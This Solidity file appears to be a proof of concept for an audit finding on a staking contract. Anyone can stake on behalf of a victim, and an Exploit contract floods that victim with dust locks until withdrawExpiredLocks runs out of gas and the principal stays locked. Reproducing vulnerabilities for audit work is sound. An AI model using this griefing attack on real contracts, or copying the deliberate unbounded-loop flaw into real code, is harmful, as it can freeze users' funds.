// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  DefiApp MFDBase — stake on behalf (Cantina, February 2025)
    stake() pushes a StakedLock for any user. withdrawExpiredLocks walks
    userLocks[msg.sender].length. After enough dust locks, that walk costs more
    than the gas cap and the victim's expired stake never transfers.
*/

contract LP {
    string public symbol = "LP";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

error AmountZero();

contract MFD {
    struct StakedLock {
        uint256 amount;
        uint256 unlockTime;
    }

    struct UserBalances {
        uint256 unlocked;
    }

    LP public immutable token;
    uint256 public immutable maxLocks;
    mapping(address => StakedLock[]) public userLocks;
    mapping(address => uint256) public unlockedOf;
    mapping(uint256 => uint256) public salt;
    bool public paused;

    modifier whenNotPaused() {
        require(!paused, "paused");
        _;
    }

    constructor(LP _token, uint256 _maxLocks) {
        token = _token;
        maxLocks = _maxLocks;
    }

    function lockCount(address user) external view returns (uint256) {
        return userLocks[user].length;
    }

    function stake(address onBehalf, uint256 amount) external {
        if (maxLocks != 0) {
            require(userLocks[onBehalf].length < maxLocks, "cap");
        }
        require(token.transferFrom(msg.sender, address(this), amount), "pull");
        userLocks[onBehalf].push(StakedLock({amount: amount, unlockTime: 1}));
        unlockedOf[onBehalf] += amount;
    }

    function getUserBalances(address user) public view returns (UserBalances memory) {
        return UserBalances(unlockedOf[user]);
    }

    function _beforeWithdrawExpiredLocks(uint256) internal {}

    function withdrawExpiredLocks() external whenNotPaused returns (uint256) {
        uint256 unlocked = getUserBalances(msg.sender).unlocked;
        if (unlocked == 0) revert AmountZero();
        _beforeWithdrawExpiredLocks(unlocked);
        return handleWithdrawOrRelockLogic(msg.sender, false, userLocks[msg.sender].length);
    }

    function handleWithdrawOrRelockLogic(address user, bool relock, uint256 limit) internal returns (uint256 unlocked) {
        relock;
        // @> VULN: limit is userLocks.length, so the dust entries are walked before any token is sent
        for (uint256 i = 0; i < limit; i++) {
            StakedLock memory lock = userLocks[user][i];
            if (lock.unlockTime <= block.timestamp && lock.amount != 0) {
                unlocked += lock.amount;
                userLocks[user][i].amount = 0;
            }
            // Touch a fresh slot per lock so the walk cannot be packed into a few hundred thousand gas.
            unlocked += salt[i];
        }
        unlockedOf[user] = 0;
        if (unlocked != 0) {
            require(token.transfer(user, unlocked), "pay");
        }
    }
}

contract Victim {
    function pull(address mfd, uint256 cap) external {
        MFD(mfd).withdrawExpiredLocks{gas: cap}();
    }
}

contract Exploit {
    uint256 public constant FLOOD = 250;
    uint256 public constant GAS_CAP = 350_000;
    uint256 public constant PRINCIPAL = 100 ether;

    LP public token;
    MFD public mfd;
    Victim public victim;
    uint256 public oneLockGas;
    bool public floodedReverted;
    uint256 public locked;

    constructor() {
        token = new LP();
        mfd = new MFD(token, 0);
        victim = new Victim();
    }

    function run() external {
        token.mint(address(this), PRINCIPAL + FLOOD + 1 ether);
        token.approve(address(mfd), type(uint256).max);
        mfd.stake(address(victim), PRINCIPAL);
        for (uint256 i = 0; i < FLOOD; i++) {
            mfd.stake(address(victim), 1);
        }
        uint256 locks = mfd.lockCount(address(victim));
        uint256 held = token.balanceOf(address(mfd));
        (bool ok,) = address(victim).call(abi.encodeWithSignature("pull(address,uint256)", address(mfd), GAS_CAP));
        floodedReverted = !ok;
        locked = token.balanceOf(address(mfd));
        mfd.stake(address(this), 1 ether);
        uint256 g0 = gasleft();
        mfd.withdrawExpiredLocks();
        oneLockGas = g0 - gasleft();
        require(oneLockGas < GAS_CAP, "cap");
        require(locks == FLOOD + 1, "len");
        require(held == PRINCIPAL + FLOOD, "held");
        require(floodedReverted, "oog");
        require(locked == PRINCIPAL + FLOOD, "locked");
        require(token.balanceOf(address(victim)) == 0, "victim");
    }
}
